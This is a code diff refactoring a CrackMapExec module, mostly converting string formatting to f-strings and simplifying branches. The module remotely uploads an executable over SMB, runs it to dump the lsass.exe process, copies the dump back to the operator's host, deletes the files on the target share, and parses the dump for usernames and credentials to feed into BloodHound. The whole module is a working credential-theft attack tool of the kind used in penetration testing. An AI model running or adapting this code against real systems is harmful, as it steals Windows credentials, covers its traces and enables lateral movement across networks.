@@ -38,19 +38,18 @@ class CMEModule:
         if 'postdmp_PATH' in module_options:
             self.postdmp_path = module_options['postdmp_PATH']
             self.useembeded = False
+        elif sys.platform == "win32":
+            appdata_path = os.getenv('APPDATA')
+            if not os.path.exists(appdata_path+"\CME"):
+                os.mkdir(appdata_path+"\CME")
+            self.postdmp_path = appdata_path + "\CME\\"
         else:
-            if sys.platform == "win32":
-                appdata_path = os.getenv('APPDATA')
-                if not os.path.exists(appdata_path+"\CME"):
-                    os.mkdir(appdata_path+"\CME")
-                self.postdmp_path = appdata_path + "\CME\\"
-            else:
-                if not os.path.exists("/tmp/cme/"):
-                    os.mkdir("/tmp/cme/")
-                self.postdmp_path = "/tmp/cme/"
+            if not os.path.exists("/tmp/cme/"):
+                os.mkdir("/tmp/cme/")
+            self.postdmp_path = "/tmp/cme/"
 
         #self.dir_result = self.postdmp_path
-        self.dir_result = os.path.abspath(os.getcwd()) + '/'
+        self.dir_result = f'{os.path.abspath(os.getcwd())}/'
 
         if 'postdmp_EXE_NAME' in module_options:
             self.postdmp = module_options['postdmp_EXE_NAME']
@@ -76,19 +75,21 @@ class CMEModule:
                 else:
                     context.log.error('Unsupported Windows architecture')
                     sys.exit(1)
-    
-        context.log.info('Copy {} to {}'.format(self.postdmp_path + self.postdmp, self.tmp_dir))
+
+        context.log.info(f'Copy {self.postdmp_path + self.postdmp} to {self.tmp_dir}')
         with open(self.postdmp_path + self.postdmp, 'rb') as postdmp:
             try:
                 connection.conn.putFile(self.share, self.tmp_share + self.postdmp, postdmp.read)
-                context.log.success('Created file {} on the \\\\{}{}'.format(self.postdmp, self.share, self.tmp_share))
+                context.log.success(
+                    f'Created file {self.postdmp} on the \\\\{self.share}{self.tmp_share}'
+                )
             except Exception as e:
-              context.log.error('Error writing file to share {}: {}'.format(self.share, e))
-    
-        timestamp = datetime.today().strftime('%Y%m%d_%H%M')
+                context.log.error(f'Error writing file to share {self.share}: {e}')
+
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M')
         dump_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".tmp"
-        command = 'cd '+ self.tmp_dir  + ' && '+ self.tmp_dir + self.postdmp + ' -o ' + dump_name
-        context.log.info('Executing command {}'.format(command))
+        command = f'cd {self.tmp_dir} && {self.tmp_dir}{self.postdmp} -o {dump_name}'
+        context.log.info(f'Executing command {command}')
         dump = False
         p = connection.execute(command, True)
         files = connection.conn.listPath(self.share, self.tmp_share + dump_name)
@@ -97,45 +98,55 @@ class CMEModule:
             context.log.error('Process lsass.exe could not be dumped, exiting..')
             try:
                 connection.conn.deleteFile(self.share, self.tmp_share + self.postdmp)
-                context.log.success('Deleted {} file on the {} share'.format(self.postdmp, self.share))
+                context.log.success(f'Deleted {self.postdmp} file on the {self.share} share')
             except Exception as e:
-                context.log.error('Error deleting {} file on share {}: {}'.format(self.postdmp, self.share, e))
+                context.log.error(
+                    f'Error deleting {self.postdmp} file on share {self.share}: {e}'
+                )
                 sys.exit(1)
-        
+
         else:
             context.log.success('Process lsass.exe was successfully dumped')
             dump = True
             try:
                 connection.conn.deleteFile(self.share, self.tmp_share + self.postdmp)
-                context.log.success('Deleted {} file on the {} share'.format(self.postdmp, self.share))
+                context.log.success(f'Deleted {self.postdmp} file on the {self.share} share')
             except Exception as e:
-                context.log.error('Error deleting {} file on share {}: {}'.format(self.postdmp, self.share, e))
-        
+                context.log.error(
+                    f'Error deleting {self.postdmp} file on share {self.share}: {e}'
+                )
+
         if dump:
             dumpsize = files[0].get_filesize()/1048576
-            context.log.info('Copying {} ({} MB) to host'.format(dump_name, str(dumpsize).split('.')[0]))
-            filename = '{}{}_{}_{}_{}.dmp'.format(self.dir_result,connection.hostname,connection.os_arch,connection.domain,timestamp)
+            context.log.info(
+                f"Copying {dump_name} ({str(dumpsize).split('.')[0]} MB) to host"
+            )
+            filename = f'{self.dir_result}{connection.hostname}_{connection.os_arch}_{connection.domain}_{timestamp}.dmp'
             with open(filename, 'wb+') as dump_file:
                 try:
                     connection.conn.getFile(self.share, self.tmp_share + dump_name, dump_file.write)
-                    context.log.success('Dumpfile of lsass.exe was transferred to {}'.format(filename))
+                    context.log.success(f'Dumpfile of lsass.exe was transferred to {filename}')
                 except Exception as e:
-                    context.log.error('Error while getting file: {}'.format(e))
+                    context.log.error(f'Error while getting file: {e}')
 
             try:
                 connection.conn.deleteFile(self.share, self.tmp_share + self.postdmp)
-                context.log.success('Deleted {} file on the {} share'.format(self.postdmp, self.share))
+                context.log.success(f'Deleted {self.postdmp} file on the {self.share} share')
             except Exception as e:
-                context.log.error('Error deleting {} file on share {}: {}'.format(self.postdmp, self.share, e))
-            
+                context.log.error(
+                    f'Error deleting {self.postdmp} file on share {self.share}: {e}'
+                )
+
             try:
                 connection.conn.deleteFile(self.share, self.tmp_share + dump_name)
-                context.log.success('Deleting {} on the {} share'.format(dump_name, self.share))
+                context.log.success(f'Deleting {dump_name} on the {self.share} share')
             except Exception as e:
-                context.log.error('Error deleting {} file on share {}: {}'.format(dump_name, self.share, e))
+                context.log.error(
+                    f'Error deleting {dump_name} file on share {self.share}: {e}'
+                )
 
-          
-            
+                      
+
             with open(filename, 'rb') as dump:
                 try:
                     credentials = []
@@ -167,7 +178,7 @@ class CMEModule:
                                     if "." not in domain and domain.upper() in connection.domain.upper():
                                         domain = connection.domain
                                         credz_bh.append({'username': username.upper(), 'domain': domain.upper()})
-                    if len(credz_bh) > 0:
+                    if credz_bh:
                         add_user_bh(credz_bh, None, context.log, connection.config)
                 except Exception as e:
                     context.log.error('Error openning dump file', str(e))
